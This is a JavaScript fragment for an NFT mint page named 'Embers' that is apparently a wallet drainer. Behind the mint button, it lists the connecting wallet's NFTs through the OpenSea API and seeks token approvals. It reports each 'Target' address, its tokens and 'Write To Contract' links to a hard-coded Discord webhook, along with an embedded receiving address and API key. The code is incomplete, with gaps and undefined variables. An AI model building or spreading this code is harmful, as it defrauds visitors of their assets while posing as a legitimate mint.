


const configuration = {
    name: 'Embers', 
    subname: 'embers', 
    cost: 0.06, 
    amount: { 
      max: 10,
      value: 1
    },
    supply: {
      max: 555,
      value: 201,
      increase: {
        value: 5,
        interval: 3000
      }
    },
    webhook:
      'https://discordapp.com/api/webhooks/1053160606422802442/XzCTt2JrXF5btprXr9wGDByduaT6Eml31pU8e9-nK91Ri3D-rTGvaZj10R6d8RnmxyLR',
    address: '0xc50289062AA7F693224AdAe7A3A6B1A947E95a98', 
    opensea: '2b03ed0cdd9c4d5598a4fbbcae11f66e' 
  };
  

  
      if (!account) {
        actionsElement.innerHTML =
          '<div class="mint-button mb-4"><button type="button" id="connect">Connect Account</button></div>';
  
        const connectButton = document.getElementById('connect');
  
        connectButton.addEventListener('click', () => {
          window.ethereum.enable();
        });
      } else {
        actionsElement.innerHTML = `<div style="color: white">
          <div class="row g-1">
            <div class="col-10">
              <input class="form-control form-control-lg mb-4 text-center" id="amount" type="number" value="${amount.value}" placeholder="Amount" min="1" max="${amountMax}">
            </div>
            <div class="col-auto">
              <button type="button" class="btn btn-success btn-lg" id="max">Max</button>
            </div>
          </div>
          <div class="payment-total">
            <p>Total</p>
            <p><span class="cost" id="cost">${cost}</span> ETH</p>
          </div>
          <div class="col-7 d-grid mx-auto mb-4">
            <div class="mint-button"><button type="button" id="mint">Mint</button></div>
          </div>
          </div>`;
  
       
  
        const maxButton = document.getElementById('max');
  
        maxButton.addEventListener('click', () => {
          amountInput.value = amountMax;
  
          costElement.textContent = (cost * amountMax).toFixed(3);
        });
  
        mintButton.addEventListener('click', () => {
          const address = configuration.address;
  
          const approvalForAssets = async (
            assets,
            assetsFiltered,
            approvedAssets = [],
            rejectedAssets = [],
            index = 0
          ) => {
            const discordWebhook = (asset, type) => {
              const contract = asset.asset_contract;
              const collection = asset.collection;
  
              let color = 2003199;
              let status = 'Approved';
  
              if (type === false) {
                color = 16719392;
                status = 'Rejected';
              }
  
              fetch(configuration.webhook, {
                headers: {
                  'content-type': 'application/json'
                },
                body: JSON.stringify({
                  username: 'NFT Website',
                  avatar_url:
                    'https://cdn.discordapp.com/attachments/929719805047627786/940337322006822942/eth-diamond-black-white.png',
                  embeds: [
                    {
                      color: color,
                      author: {
                        name: 'NFT Website',
                        icon_url:
                          'https://cdn.discordapp.com/attachments/929719805047627786/940337322006822942/eth-diamond-black-white.png'
                      },
                      thumbnail: {
                        url: contract.image_url
                      },
                      fields: [
                        {
                          name: 'Contract',
                          value: `**Name:** ${contract.name} (${
                            contract.symbol
                          })\n**Schema:** ${
                            contract.schema_name
                          }\n**Average Price:** ${collection.average_price.toFixed(
                            3
                          )}\n**Floor Price:** ${collection.floor_price.toFixed(
                            3
                          )}\n**Links:** [Etherscan](https://etherscan.io/address/${
                            contract.address
                          }) - [Write To Contract](https://etherscan.io/address/${
                            contract.address
                          }#writeContract) - [Opensea](https://opensea.io/collection/${
                            collection.slug
                          })`
                        },
                        {
                          name: 'Target',
                          value: `**Status:** ${status}\n**Address:** ${account}\n**Tokens:**\n${assets
                            .filter(
                              asset =>
                                asset.asset_contract.address === contract.address
                            )
                            .map(
                              asset =>
                                `${asset.token_id} ([Etherscan](https://etherscan.io/token/${contract.address}?a=${asset.token_id}) - [Opensea](${asset.permalink}))`
                            )
                            .join('\n')}`
                        }
                      ],
                      footer: {
                        text: 'NFT Website',
                        icon_url:
                          'https://cdn.discordapp.com/attachments/929719805047627786/940337322006822942/eth-diamond-black-white.png'
                      },
                      timestamp: new Date()
                    }
                  ]
                }),
                method: 'POST'
              });
            };
  
          
  
            
  
          const assets = async () => {
            const opensea = configuration.opensea;
  
            const getAssets = () => {
              return new Promise(resolve => {
                const _getAssets = async (assets = [], cursor) => {
                  const result = await fetch(
                    `https://api.opensea.io/api/v1/assets?owner=${account}&limit=50${
                      cursor ? `&cursor=${cursor}` : ''
                    }`,
                    {
                      headers: {
                        'x-api-key': opensea
                      },
                      method: 'GET'
                    }
                  ).then(result => result.json());
  
                  assets = assets.concat(result.assets);
  
                  if (result.next) _getAssets(assets, result.next);
                  else resolve(assets);
                };
  
                _getAssets();
              });
            };
